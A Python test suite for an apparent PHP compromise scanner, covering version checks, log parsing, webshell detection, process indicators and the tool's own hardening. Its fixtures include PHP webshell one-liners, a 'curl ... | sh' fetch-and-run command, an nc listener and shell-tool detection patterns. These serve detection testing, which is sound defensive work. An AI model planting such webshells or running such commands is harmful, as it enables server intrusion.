"""Tests for am-i-infected. Synthetic fixtures and mocks only; no exploit code or traffic."""
import datetime as dt
import gzip
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = os.path.join(HERE, "am_i_infected.py")
sys.path.insert(0, HERE)
import am_i_infected as aii  # noqa: E402

SINCE = dt.datetime(2026, 10, 1)
NOW = dt.datetime(2026, 10, 23, 12, 0, 0)


def run_tool(*args):
    r = subprocess.run([sys.executable, TOOL, "--json", "--no-procs", "--no-persistence",
                        "--no-journal", "--no-exec", "--no-integrity", *args], capture_output=True, text=True)
    return r.returncode, json.loads(r.stdout)


def ids(report):
    return {f["id"]: f for f in report["findings"]}


def fids(rep):
    return {f.id: f for f in rep.findings}


# ---------------------------------------------------------------- versions
class VersionTests(unittest.TestCase):
    def test_classify(self):
        self.assertEqual(aii.classify_version("8.3.35"), "vulnerable")
        self.assertEqual(aii.classify_version("8.3.36"), "ok")
        self.assertEqual(aii.classify_version("8.2.34"), "vulnerable")
        self.assertEqual(aii.classify_version("8.2.35"), "ok")
        self.assertEqual(aii.classify_version("8.4.26"), "vulnerable")
        self.assertEqual(aii.classify_version("8.4.27"), "ok")
        self.assertEqual(aii.classify_version("8.5.11"), "vulnerable")
        self.assertEqual(aii.classify_version("8.5.12"), "ok")
        self.assertEqual(aii.classify_version("7.4.33"), "vulnerable")
        self.assertEqual(aii.classify_version("9.0.1"), "unknown")
        self.assertEqual(aii.classify_version("garbage"), "unknown")

    def test_prerelease_is_unknown_but_distro_suffix_is_not(self):
        self.assertEqual(aii.classify_version("8.5.12", "-dev"), "unknown")
        self.assertEqual(aii.classify_version("8.5.12", "RC1"), "unknown")
        self.assertEqual(aii.classify_version("8.3.6", "-0ubuntu0.24.04.5"), "vulnerable")
        self.assertEqual(aii.classify_version("8.2.29", "-1~deb12u1"), "vulnerable")

    def test_verdicts(self):
        both = list(aii.CVES)
        self.assertEqual(aii.verdict_for("8.3.36", "", []), "patched")
        self.assertEqual(aii.verdict_for("8.3.6", "", both), "patched (distro backport)")
        self.assertEqual(aii.verdict_for("8.3.6", "", both[:1]), "unknown")
        self.assertEqual(aii.verdict_for("8.3.6", "", []), "likely vulnerable")
        self.assertEqual(aii.verdict_for(None, None, []), "unknown")

    def test_fixed_hint(self):
        self.assertIn("8.3.36", aii.fixed_hint("8.3.6"))
        self.assertIn("no upstream fixed release", aii.fixed_hint("8.1.20"))


class PackageTests(unittest.TestCase):
    def _run(self, version_out, backported):
        installs = {"/usr/sbin/php-fpm8.3": {"kind": "php-fpm", "source": "installed"}}
        rep = aii.Report(SINCE, 15)
        with mock.patch.object(aii, "discover_php_installs", return_value=installs), \
                mock.patch.object(aii, "apache_maps", return_value=(set(), {})), \
                mock.patch.object(aii, "untrusted_reason", return_value=""), \
                mock.patch.object(aii, "run_php_version", return_value=version_out), \
                mock.patch.object(aii, "pkg_owner", return_value=("dpkg", "php8.3-fpm")), \
                mock.patch.object(aii, "changelog_cves", return_value=backported):
            rows, pkgs = aii.check_php_installs(rep, {}, False)
        return rep, rows, pkgs

    def test_distro_backport_is_patched(self):
        rep, rows, pkgs = self._run("PHP 8.3.6-0ubuntu0.24.04.5 (cli)", list(aii.CVES))
        self.assertEqual(rows[0]["verdict"], "patched (distro backport)")
        self.assertEqual(fids(rep)["exposure.php_version"].category, "info")
        self.assertIn(("dpkg", "php8.3-fpm"), pkgs)

    def test_old_version_without_backport_is_high_exposure(self):
        rep, rows, _ = self._run("PHP 8.3.6-0ubuntu0.24.04.5 (cli)", [])
        f = fids(rep)["exposure.php_version"]
        self.assertEqual((f.severity, f.category), ("high", "exposure"))
        self.assertEqual(aii.exit_code(rep) & 1, 1)

    def test_version_falls_back_to_package_database_with_no_exec(self):
        installs = {"/usr/lib/apache2/modules/libphp8.3.so": {"kind": "mod_php", "source": "installed"}}
        rep = aii.Report(SINCE, 15)
        with mock.patch.object(aii, "discover_php_installs", return_value=installs), \
                mock.patch.object(aii, "apache_maps", return_value=(set(), {})), \
                mock.patch.object(aii, "pkg_owner", return_value=("dpkg", "libapache2-mod-php8.3")), \
                mock.patch.object(aii, "pkg_version", return_value=("8.3.36", "8.3.36-1")), \
                mock.patch.object(aii, "changelog_cves", return_value=[]):
            rows, _ = aii.check_php_installs(rep, {}, True)
        self.assertEqual(rows[0]["version_source"], "dpkg package")
        self.assertEqual(rows[0]["verdict"], "patched")

    def test_verify_package_parses_and_ignores_config_files(self):
        out = ("??5??????   /usr/sbin/php-fpm8.3\n"
               "??5??????   c /etc/php/8.3/fpm/php.ini\n"
               "..?......   /usr/lib/php/20230831/opcache.so\n"
               "missing     /usr/share/doc/x\n")
        with mock.patch.object(aii, "run_rc", return_value=(1, out, "")):
            self.assertEqual(aii.verify_package("dpkg", "php8.3-fpm"), ["/usr/sbin/php-fpm8.3"])
        rpm = "S.5....T.  c /etc/php.ini\nS.5....T.    /usr/sbin/php-fpm\n"
        with mock.patch.object(aii, "run_rc", return_value=(1, rpm, "")):
            self.assertEqual(aii.verify_package("rpm", "php-fpm"), ["/usr/sbin/php-fpm"])

    def test_integrity_finding_is_high_and_flags_file(self):
        rep = aii.Report(SINCE, 15)
        with mock.patch.object(aii, "verify_package", return_value=["/usr/sbin/php-fpm8.3"]):
            aii.check_integrity(rep, {("dpkg", "php8.3-fpm")})
        f = fids(rep)["exposure.package_integrity"]
        self.assertEqual((f.severity, f.category), ("high", "indicator"))
        self.assertIn("/usr/sbin/php-fpm8.3", rep.flagged)

    @unittest.skipUnless(shutil.which("dpkg"), "dpkg not available")
    def test_real_dpkg_owner_lookup(self):
        pm, pkg = aii.pkg_owner(os.path.realpath("/bin/sh"))
        self.assertEqual(pm, "dpkg")
        self.assertTrue(pkg)
        _ver, full = aii.pkg_version(pm, pkg)
        self.assertTrue(full)


# ---------------------------------------------------------------- timestamps / logs
class TimestampTests(unittest.TestCase):
    def test_formats(self):
        cases = {
            '1.2.3.4 - - [21/Oct/2026:10:15:32 +0000] "GET / HTTP/1.1" 200 1': (2026, 10, 21, 10, 15, 32),
            "[21-Oct-2026 10:15:32] WARNING: x": (2026, 10, 21, 10, 15, 32),
            "[21-Oct-2026 10:15:32 UTC] PHP Fatal error": (2026, 10, 21, 10, 15, 32),
            "2026/10/21 10:15:32 [error] 1#1: x": (2026, 10, 21, 10, 15, 32),
            "[Wed Oct 21 10:15:32.123456 2026] [php:error] x": (2026, 10, 21, 10, 15, 32),
            "2026-10-21T10:15:32+0300 host unit[1]: x": (2026, 10, 21, 10, 15, 32),
            "Oct 21 10:15:32 host php-fpm8.3[1]: x": (2026, 10, 21, 10, 15, 32),
        }
        for line, exp in cases.items():
            self.assertEqual(aii.parse_ts(line, NOW), dt.datetime(*exp), line)
        self.assertIsNone(aii.parse_ts("no timestamp here", NOW))


class LogTests(unittest.TestCase):
    def test_detects_markers_bursts_and_correlation(self):
        with tempfile.TemporaryDirectory() as d:
            acc = os.path.join(d, "access.log")
            with open(acc, "w") as fh:
                for i in range(12):
                    fh.write(f'203.0.113.9 - - [21/Oct/2026:10:{i:02d}:00 +0000] "POST /index.php HTTP/1.1" 500 10 "-" "x"\n')
                fh.write('203.0.113.9 - - [21/Oct/2026:10:20:00 +0000] "POST /a.php?PHP_SESSION_UPLOAD_PROGRESS=1 HTTP/1.1" 500 1 "-" "x"\n')
                fh.write('198.51.100.1 - - [21/Oct/2026:10:30:00 +0000] "GET / HTTP/1.1" 200 1 "-" "PHPSESSID=' + "A" * 400 + '"\n')
                fh.write('198.51.100.2 - - [01/Jan/2020:10:30:00 +0000] "POST /old.php HTTP/1.1" 500 1 "-" "-"\n')
            err = os.path.join(d, "php-fpm.log")
            with open(err, "w") as fh:
                fh.write("[21-Oct-2026 10:40:00] WARNING: [pool www] child 123 exited on signal 11 (SIGSEGV) after 3.2 seconds from start\n")
                fh.write("[21-Oct-2026 10:41:00] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8192 bytes) in /x.php on line 1\n")
                fh.write("[21-Oct-2026 10:42:00] PHP Warning:  session_start(): Session ID is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in /x.php\n")
            with gzip.open(os.path.join(d, "error.log.1.gz"), "wt") as fh:
                fh.write("2026/10/22 03:00:00 [error] 1#1: *1 FastCGI sent in stderr: \"PHP message: Maximum execution time of 30 seconds exceeded\"\n")
            code, rep = run_tool("--no-fs", "--since", "2026-10-01", "--log-path", d)
            f = ids(rep)
            for key in ("log.upload_progress_marker", "log.oversize_phpsessid", "log.post_5xx_burst",
                        "log.worker_crash", "log.memory_exhausted", "log.bad_session_id", "log.correlated",
                        "log.attempt_sources"):
                self.assertIn(key, f, key)
            blob = json.dumps(rep)
            self.assertNotIn("A" * 50, blob)         # session id redacted
            self.assertNotIn("old.php", blob)        # outside the window
            self.assertTrue(code & 2)
            self.assertEqual(rep["coverage"]["log_files"], 3)
            self.assertTrue(rep["timeline"])
            self.assertIn("203.0.113.9", json.dumps(f["log.attempt_sources"]))

    def test_clean_logs_yield_no_medium(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "access.log"), "w") as fh:
                fh.write('203.0.113.9 - - [21/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "x"\n')
                fh.write('203.0.113.9 - - [21/Oct/2026:10:01:00 +0000] "POST /login.php HTTP/1.1" 302 1 "-" "x"\n')
            code, rep = run_tool("--no-fs", "--since", "2026-10-01", "--log-path", d)
            self.assertEqual(code & 6, 0)
            self.assertFalse([f for f in rep["findings"] if f["category"] == "indicator"])

    def test_poc_user_agent_fingerprints(self):
        sc = aii.LogScanner(SINCE, NOW)
        for ua in ("php2shell-109618", "php2shell-scan/109618", "php2shell-verify/1.0"):
            sc.feed("access.log", f'192.0.2.7 - - [21/Oct/2026:09:00:00 +0000] "POST / HTTP/1.1" 200 1 "-" "{ua}"')
        sc.feed("access.log", '192.0.2.8 - - [21/Oct/2026:09:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "Mozilla/5.0"')
        rep = aii.Report(SINCE, 15)
        sc.finalize(rep)
        self.assertEqual(sc.counts["ua_ioc"], 3)
        self.assertIn("log.poc_user_agent", fids(rep))
        self.assertIn("192.0.2.7", json.dumps([f.evidence for f in rep.findings]))
        self.assertNotIn("192.0.2.8", json.dumps([f.evidence for f in rep.findings]))

    def test_custom_upload_progress_name_is_a_marker(self):
        line = '198.51.100.4 - - [21/Oct/2026:09:00:00 +0000] "POST /x.php?my_progress_field=1 HTTP/1.1" 200 1 "-" "-"'
        sc = aii.LogScanner(SINCE, NOW, extra_markers=["MY_PROGRESS_FIELD"])
        sc.feed("waf.log", line)
        self.assertEqual(sc.counts["marker"], 1)
        sc2 = aii.LogScanner(SINCE, NOW)
        sc2.feed("waf.log", line)
        self.assertEqual(sc2.counts["marker"], 0)

    def test_auth_log_web_user_login_and_sudo(self):
        sc = aii.LogScanner(SINCE, NOW, web_names={"www-data"}, web_uids={33})
        sc.mode = "auth"
        sc.feed("auth.log", "Oct 21 11:00:00 host sshd[1]: Accepted publickey for www-data from 203.0.113.50 port 5555 ssh2")
        sc.feed("auth.log", "Oct 21 11:01:00 host sshd[1]: Accepted publickey for alice from 203.0.113.51 port 5555 ssh2")
        sc.feed("auth.log", "Oct 21 11:02:00 host sudo[9]: www-data : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls")
        sc.feed("auth.log", "Oct 21 11:03:00 host sudo[9]: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls")
        self.assertEqual(sc.counts["web_user_login"], 1)
        self.assertEqual(sc.counts["web_user_sudo"], 1)
        rep = aii.Report(SINCE, 15)
        sc.finalize(rep)
        self.assertEqual(fids(rep)["log.web_user_login"].severity, "high")

    def test_auditd_exec_by_web_user(self):
        epoch = int(dt.datetime(2026, 10, 21, 11, 0, 0).timestamp())
        base = ('type=SYSCALL msg=audit(%d.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=1 items=2 '
                'ppid=1234 pid=5678 auid=%s uid=%s gid=33 euid=%s suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 '
                'tty=(none) ses=4294967295 comm="%s" exe="%s" key="exec"')
        sc = aii.LogScanner(SINCE, NOW, web_names={"www-data"}, web_uids={33})
        sc.mode = "audit"
        sc.feed("audit.log", base % (epoch, "4294967295", "33", "33", "sh", "/usr/bin/dash"))      # shell: counts
        sc.feed("audit.log", base % (epoch, "4294967295", "33", "33", "curl", "/usr/bin/curl"))    # weak tool
        sc.feed("audit.log", base % (epoch, "1000", "33", "33", "sh", "/usr/bin/dash"))            # has a login session
        sc.feed("audit.log", base % (epoch, "4294967295", "1000", "1000", "sh", "/usr/bin/dash"))  # not a web user
        sc.feed("audit.log", base.replace("syscall=59", "syscall=2") % (epoch, "4294967295", "33", "33", "sh", "/usr/bin/dash"))
        self.assertEqual(sc.counts["audit_web_exec"], 1)
        self.assertEqual(sc.counts["audit_web_exec_weak"], 1)

    def test_kernel_segfault_line_counts_as_worker_crash(self):
        sc = aii.LogScanner(SINCE, NOW)
        sc.feed("journalctl", "2026-10-21T10:00:00+0000 host kernel: php-fpm8.3[1234]: segfault at 7f00 ip 00007f in libc.so.6")
        self.assertEqual(sc.counts["worker_signal"], 1)


# ---------------------------------------------------------------- correlation
class KillchainTests(unittest.TestCase):
    def test_attempt_followed_by_new_php_file(self):
        rep = aii.Report(SINCE, 15)
        rep.add_event(dt.datetime(2026, 10, 21, 10, 5), "marker", "access.log", "PHP_SESSION_UPLOAD_PROGRESS")
        rep.add_event(dt.datetime(2026, 10, 21, 12, 30), "fs_php_new", "/var/www/a.php", "PHP file modified")
        aii.correlate_killchain(rep)
        f = fids(rep)["correlate.killchain"]
        self.assertEqual(f.severity, "high")
        self.assertIn("a.php", f.evidence[0])

    def test_unrelated_file_change_is_not_correlated(self):
        rep = aii.Report(SINCE, 15)
        rep.add_event(dt.datetime(2026, 10, 21, 10, 5), "marker", "access.log", "x")
        rep.add_event(dt.datetime(2026, 10, 21, 20, 30), "fs_php_new", "/var/www/a.php", "PHP file modified")
        rep.add_event(dt.datetime(2026, 10, 20, 9, 0), "fs_php_new", "/var/www/b.php", "before the attempt")
        aii.correlate_killchain(rep)
        self.assertNotIn("correlate.killchain", fids(rep))

    def test_no_attempts_no_finding(self):
        rep = aii.Report(SINCE, 15)
        rep.add_event(dt.datetime(2026, 10, 21, 12, 30), "fs_php_new", "/var/www/a.php", "x")
        aii.correlate_killchain(rep)
        self.assertFalse(rep.findings)


# ---------------------------------------------------------------- filesystem
class FilesystemTests(unittest.TestCase):
    def test_webshell_config_and_timestomp(self):
        with tempfile.TemporaryDirectory() as d:
            up = os.path.join(d, "wp-content", "uploads", "2026")
            os.makedirs(up)
            with open(os.path.join(up, "x.php"), "w") as fh:
                fh.write("<?php system($_GET['c']); ?>")
            with open(os.path.join(d, "legit.php"), "w") as fh:
                fh.write("<?php echo 'hello'; ?>")
            with open(os.path.join(d, "obf.php"), "w") as fh:
                fh.write("<?php eval(base64_decode('ZWNobyAxOw==')); ?>")
            with open(os.path.join(d, ".user.ini"), "w") as fh:
                fh.write("auto_prepend_file = /tmp/evil.php\n")
            with open(os.path.join(d, ".htaccess"), "w") as fh:
                fh.write("AddType application/x-httpd-php .jpg\n")
            stomped = os.path.join(d, "stomped.php")
            with open(stomped, "w") as fh:
                fh.write("<?php system($_POST['x']); ?>")
            os.utime(stomped, (1_500_000_000, 1_500_000_000))   # forged old mtime; ctime is NOW

            code, rep = run_tool("--no-logs", "--since", "2026-01-01", "--webroot", d)
            f = ids(rep)
            for key in ("fs.webshell_signature_high", "fs.webshell_signature_medium", "fs.auto_prepend",
                        "fs.handler_override", "fs.recent_php", "fs.timestomp_suspect"):
                self.assertIn(key, f, key)
            self.assertTrue(code & 4)
            high = json.dumps(f["fs.webshell_signature_high"])
            self.assertIn("x.php", high)
            self.assertIn("stomped.php", high)                 # caught despite the forged mtime
            self.assertIn("stomped.php", json.dumps(f["fs.timestomp_suspect"]))
            self.assertNotIn("stomped.php", json.dumps(f["fs.recent_php"]))
            self.assertNotIn("legit.php", high)
            # the web root itself lives under /tmp: that must not make every file "risky"
            risky = json.dumps(f["fs.php_in_risky_dir"]) if "fs.php_in_risky_dir" in f else ""
            self.assertNotIn("legit.php", risky)

    def test_decoded_request_data_in_eval_is_high(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "loader.php"), "w") as fh:
                fh.write("<?php eval(base64_decode($_POST['z'])); ?>")
            rep = aii.Report(SINCE, 15)
            aii.scan_webroots(rep, [d], dt.datetime(2026, 1, 1))
            f = fids(rep)["fs.webshell_signature_high"]
            self.assertIn("decoded and passed to eval", f.evidence[0])

    def test_poc_scan_ignores_rules_docs_and_own_checkout(self):
        with tempfile.TemporaryDirectory() as d:
            own = os.path.join(d, "am-i-infected", "sigma")
            os.makedirs(own)
            open(os.path.join(own, "php2shell_rule.yml"), "w").close()
            open(os.path.join(d, "php2shell-notes.md"), "w").close()
            open(os.path.join(d, "php2shell_exploit.py"), "w").close()
            rep = aii.Report(SINCE, 15)
            aii.scan_artifacts(rep, [d], SINCE)
            ev = json.dumps(fids(rep)["fs.poc_artifact"].evidence)
            self.assertIn("php2shell_exploit.py", ev)
            self.assertNotIn("php2shell_rule.yml", ev)
            self.assertNotIn("php2shell-notes.md", ev)

    def test_poc_artifacts(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "tools", "php2shell-poc"))
            open(os.path.join(d, "tools", "poc0_109618.py"), "w").close()
            open(os.path.join(d, "index.php"), "w").close()
            rep = aii.Report(SINCE, 15)
            aii.scan_artifacts(rep, [d], SINCE)
            ev = json.dumps(fids(rep)["fs.poc_artifact"].evidence)
            self.assertIn("php2shell-poc", ev)
            self.assertIn("poc0_109618.py", ev)
            self.assertNotIn("index.php", ev)

    def test_session_files(self):
        with tempfile.TemporaryDirectory() as d:
            sid = "abcdefghij0123456789abcdef"
            with open(os.path.join(d, f"sess_{sid}"), "w") as fh:
                fh.write("upload_progress_x|a:1:{s:4:\"test\";i:1;}")
            with open(os.path.join(d, "sess_" + "Z" * 200), "w") as fh:
                fh.write("x")
            with open(os.path.join(d, "sess_huge"), "wb") as fh:
                fh.write(b"A" * 1_200_000)
            rep = aii.Report(SINCE, 15)
            aii.scan_sessions(rep, dt.datetime(2026, 1, 1), {"session_paths": {d}})
            f = fids(rep)
            self.assertIn("fs.session_oversize_id", f)
            self.assertIn("fs.session_huge", f)
            self.assertIn("fs.session_upload_progress", f)
            blob = json.dumps([x.evidence for x in rep.findings])
            self.assertNotIn("Z" * 20, blob)                  # IDs are redacted
            self.assertNotIn(sid, blob)


# ---------------------------------------------------------------- config
class ConfigTests(unittest.TestCase):
    def test_posture_prepend_extensions_and_custom_name(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "php.ini"), "w") as fh:
                fh.write("; comment\nsession.upload_progress.enabled = 0\npost_max_size = 8M\n"
                         "session.upload_progress.name = \"MY_FIELD\"\nsession.save_path = \"2;0600;/var/lib/x\"\n"
                         "auto_prepend_file = /var/www/waf.php\nextension=/tmp/evil.so\n"
                         "extension=/usr/lib/php/20230831/curl.so\nzend_extension = /data/weird/x.so\n")
            with open(os.path.join(d, "pool.conf"), "w") as fh:
                fh.write("php_admin_value[memory_limit] = -1\nphp_admin_flag[session.upload_progress.enabled] = off\n")
            with open(os.path.join(d, "vhost.conf"), "w") as fh:
                fh.write("php_admin_value fatal_error_backtraces 0\n")
            rep = aii.Report(SINCE, 50)
            with mock.patch.object(aii, "CONFIG_GLOBS", [os.path.join(d, "*.ini"), os.path.join(d, "*.conf")]):
                cfg = aii.audit_php_config(rep)
            f = fids(rep)
            posture = json.dumps(f["exposure.mitigation_posture"].evidence)
            for needle in ("session.upload_progress.enabled = 0", "post_max_size = 8M", "memory_limit = -1",
                           "fatal_error_backtraces = 0"):
                self.assertIn(needle, posture)
            self.assertEqual(cfg["upload_progress_names"], {"MY_FIELD"})
            self.assertIn("2;0600;/var/lib/x", cfg["session_paths"])
            self.assertIn("config.auto_prepend_system", f)
            ext = f["config.extension_path"]
            self.assertEqual(ext.severity, "high")
            self.assertIn("/tmp/evil.so", json.dumps(ext.evidence))
            self.assertIn("/data/weird/x.so", json.dumps(ext.evidence))
            self.assertNotIn("curl.so", json.dumps(ext.evidence))


# ---------------------------------------------------------------- live system
class ProcessTests(unittest.TestCase):
    PROCS = {
        10: {"comm": "php-fpm8.3", "ppid": 1, "uid": 0, "cmd": "php-fpm: master", "exe": None},
        11: {"comm": "php-fpm8.3", "ppid": 10, "uid": 33, "cmd": "php-fpm: pool www", "exe": None},
        12: {"comm": "sh", "ppid": 11, "uid": 33, "cmd": "sh -c curl http://203.0.113.7/x.sh | sh", "exe": None},
        13: {"comm": "sh", "ppid": 11, "uid": 33, "cmd": "sh -c /usr/sbin/sendmail -t -i", "exe": None},
        14: {"comm": "id", "ppid": 11, "uid": 33, "cmd": "id", "exe": None},
        15: {"comm": "nc", "ppid": 1, "uid": 33, "cmd": "nc -lvp 4444", "exe": "/tmp/.x/nc"},
        16: {"comm": "python3", "ppid": 1, "uid": 1000, "cmd": "python3 poc0_109618.py", "exe": "/usr/bin/python3"},
        17: {"comm": "bash", "ppid": 1, "uid": 1000, "cmd": "bash", "exe": "/usr/bin/bash"},
    }

    def test_worker_children_and_tmp_exec_and_poc(self):
        rep = aii.Report(SINCE, 15)
        aii.check_process_indicators(rep, self.PROCS)
        f = fids(rep)
        self.assertEqual(f["proc.worker_child_malicious"].severity, "high")
        self.assertIn("pid 12", json.dumps(f["proc.worker_child_malicious"].evidence))
        self.assertEqual(f["proc.worker_child_shell"].severity, "medium")     # id
        self.assertEqual(f["proc.worker_child_tool"].severity, "low")         # sendmail
        self.assertIn("proc.web_user_tmp_exec", f)                            # nc from /tmp, web uid
        self.assertIn("proc.poc_artifact", f)
        self.assertNotIn("pid 17", json.dumps([x.evidence for x in rep.findings]))   # unrelated bash

    def test_proc_net_address_parsing(self):
        ip, port = aii._addr("0100007F:0050", False)
        self.assertEqual((str(ip), port), ("127.0.0.1", 80))
        ip, port = aii._addr("00000000000000000000000001000000:1F90", True)
        self.assertEqual((str(ip), port), ("::1", 8080))


class DockerTests(unittest.TestCase):
    TOP = ("PID PPID USER COMMAND COMMAND\n"
           "100 1 root php-fpm8.3 php-fpm: master process\n"
           "101 100 www-data php-fpm8.3 php-fpm: pool www\n"
           "102 101 www-data sh sh -c curl http://203.0.113.7/x.sh | sh\n")

    def test_parse_top(self):
        procs = aii.parse_docker_top(self.TOP)
        self.assertEqual(procs[102]["ppid"], 101)
        self.assertEqual(procs[102]["uid"], "www-data")
        self.assertIn("curl", procs[102]["cmd"])

    def test_check_docker(self):
        def fake(cmd, timeout=15):
            if cmd[1] == "ps":
                return 0, "abc123\tweb\twordpress:6.7\nzzz999\tdb\tmysql:8\n", ""
            if cmd[1] == "inspect" and cmd[-1] == "abc123":
                return 0, "PATH=/usr/bin\nPHP_VERSION=8.3.35\n", ""
            if cmd[1] == "inspect":
                return 0, "PATH=/usr/bin\n", ""
            if cmd[1] == "exec":
                return 1, "", "executable file not found"
            if cmd[1] == "top":
                return 0, self.TOP, ""
            return 1, "", ""
        rep = aii.Report(SINCE, 15)
        with mock.patch.object(aii.shutil, "which", return_value="/usr/bin/docker"), \
                mock.patch.object(aii, "run_rc", side_effect=fake):
            aii.check_docker(rep, no_exec=False, no_procs=False)
        f = fids(rep)
        self.assertEqual(f["exposure.docker_php"].severity, "high")
        self.assertIn("web (wordpress:6.7)", f["exposure.docker_php"].evidence[0])
        self.assertEqual(len(f["exposure.docker_php"].evidence), 1)          # mysql container skipped
        self.assertEqual(f["proc.worker_child_malicious.web"].severity, "high")
        self.assertEqual(rep.coverage["containers_with_php"], 1)


# ---------------------------------------------------------------- the tool as an attack surface
class SecurityTests(unittest.TestCase):
    """The tool runs as root over attacker-influenced input: logs, file names, process table, files."""

    def test_untrusted_binary_is_never_executed_and_is_reported(self):
        d = tempfile.mkdtemp(dir="/tmp")
        try:
            fake = os.path.join(d, "php-fpm8.3")
            with open(fake, "wb") as fh:
                fh.write(aii.ELF_MAGIC + b"\0" * 64)
            os.chmod(fake, 0o755)
            procs = {42: {"comm": "php-fpm8.3", "ppid": 1, "uid": 33, "cmd": "php-fpm: pool www", "exe": fake}}

            def guard(path):
                if path.startswith(d):
                    raise AssertionError("tool executed an attacker-controlled binary: " + path)
                return ""
            rep = aii.Report(SINCE, 15)
            with mock.patch.object(aii, "run_php_version", side_effect=guard), \
                    mock.patch.object(aii, "apache_maps", return_value=(set(), {})), \
                    mock.patch.object(aii, "pkg_owner", return_value=(None, None)):
                aii.check_php_installs(rep, procs, no_exec=False)
            f = fids(rep)
            self.assertEqual(f["proc.php_masquerade"].severity, "high")
            self.assertIn("exposure.exec_refused", f)
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_untrusted_reason_cases(self):
        d = tempfile.mkdtemp(dir="/tmp")
        try:
            plain = os.path.join(d, "x")
            open(plain, "w").close()
            self.assertIn("temp/home/web", aii.untrusted_reason(plain))
            # an administrator can vouch explicitly
            with mock.patch.object(aii, "TRUSTED_EXEC", {os.path.realpath(plain)}):
                self.assertEqual(aii.untrusted_reason(plain), "")
            # a genuine system binary passes (when this sandbox layout is root-owned)
            sh = os.path.realpath("/bin/sh")
            if os.stat(sh).st_uid == 0:
                self.assertEqual(aii.untrusted_reason(sh), "")
            # a non-ELF file (script) is refused even if the location were fine
            with mock.patch.object(aii, "UNTRUSTED_PREFIXES", ()):
                self.assertTrue(aii.untrusted_reason(plain))   # not ELF / not root-owned dir
        finally:
            shutil.rmtree(d, ignore_errors=True)

    @unittest.skipUnless(hasattr(os, "geteuid") and os.geteuid() == 0, "needs root to test privilege drop")
    def test_php_version_probe_runs_unprivileged(self):
        d = tempfile.mkdtemp()
        try:
            os.chmod(d, 0o755)
            script = os.path.join(d, "php")
            with open(script, "w") as fh:
                fh.write('#!/bin/sh\necho "PHP 8.3.99 (cli) uid=$(id -u) cwd=$(pwd) home=${HOME:-none}"\n')
            os.chmod(script, 0o755)
            out = aii.run_php_version(script)
            self.assertIn("uid=65534", out)
            self.assertIn("cwd=/", out)
            self.assertIn("home=none", out)                  # clean environment
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_control_characters_are_neutralised(self):
        rep = aii.Report(SINCE, 15)
        evil = "/var/www/x\x1b[2J\x1b[Hcleared.php\rFAKE\nRESULT: nothing found"
        rep.add("demo", "high", "indicator", "t\x1b[31m", "d\x07", [evil])
        rep.add_event(NOW, "k", evil, evil)
        text = aii.render_text(rep, {"host": "h", "time": "t", "user": "root"}, color=False, timeline=5)
        for bad in ("\x1b", "\r", "\x07"):
            self.assertNotIn(bad, text)
        self.assertIn("\\x1b[2J", text)                     # visible, escaped form
        sc = aii.LogScanner(SINCE, NOW)
        sc.feed("a.log", '1.2.3.4 - - [21/Oct/2026:10:00:00 +0000] "GET /\x1b[2J HTTP/1.1" 200 1 "-" "php2shell-x\x1b[H"')
        self.assertNotIn("\x1b", "".join(sc.samples["ua_ioc"]))

    def test_crafted_files_cannot_stall_the_scan(self):
        import time
        blob = "\n" * 65536                                   # took >70 s with the old \s* patterns
        t0 = time.time()
        list(aii.PREPEND_RE.finditer(blob))
        aii.HANDLER_RE.search(blob)
        aii.BAD_CMD.search("curl " * 16000)
        aii.BAD_CMD.search("ncat " * 16000)
        self.assertLess(time.time() - t0, 2.0)
        # the real code path as well
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, ".htaccess"), "w") as fh:
                fh.write(blob)
            t0 = time.time()
            aii.scan_webroots(aii.Report(SINCE, 15), [d], SINCE)
            self.assertLess(time.time() - t0, 3.0)

    def test_huge_log_line_is_processed_in_chunks(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "access.log")
            with open(p, "w") as fh:
                fh.write("A" * 300_000 + "\n")
                fh.write('203.0.113.1 - - [21/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "x"\n')
            sc = aii.LogScanner(SINCE, NOW)
            sc.scan_file(p)
            self.assertGreaterEqual(sc.lines, 6)              # 300 KB split into 64 KB chunks + the normal line
            self.assertEqual(sc.files, 1)

    def test_symlinks_are_not_followed(self):
        with tempfile.TemporaryDirectory() as d:
            target = os.path.join(d, "secret.txt")
            with open(target, "w") as fh:
                fh.write("auto_prepend_file = /etc/shadow-secret\n")
            link = os.path.join(d, ".user.ini")
            os.symlink(target, link)
            with self.assertRaises(OSError):
                aii.read_nofollow(link)
            self.assertEqual(aii.read_nofollow(target), b"auto_prepend_file = /etc/shadow-secret\n")
            rep = aii.Report(SINCE, 15)
            aii.scan_webroots(rep, [d], SINCE)
            self.assertNotIn("fs.auto_prepend", fids(rep))     # symlinked config is not read
            # a flagged path that turns into a symlink is not copied into the evidence bundle
            rep.flag(link, "swapped for a symlink")
            out = os.path.join(d, "b.tar.gz")
            added, skipped = aii.collect_evidence(out, rep, None, {}, "{}")
            self.assertEqual((added, skipped), (0, 1))
            with tarfile.open(out) as tar:
                self.assertFalse([n for n in tar.getnames() if n.startswith("flagged/")])

    def test_fifo_cannot_hang_reads(self):
        with tempfile.TemporaryDirectory() as d:
            fifo = os.path.join(d, "x.php")
            os.mkfifo(fifo)
            with self.assertRaises(OSError):
                aii.read_nofollow(fifo)                        # must return/raise immediately, not block


# ---------------------------------------------------------------- evidence / output / robustness
class EvidenceTests(unittest.TestCase):
    def test_collect_bundle(self):
        with tempfile.TemporaryDirectory() as d:
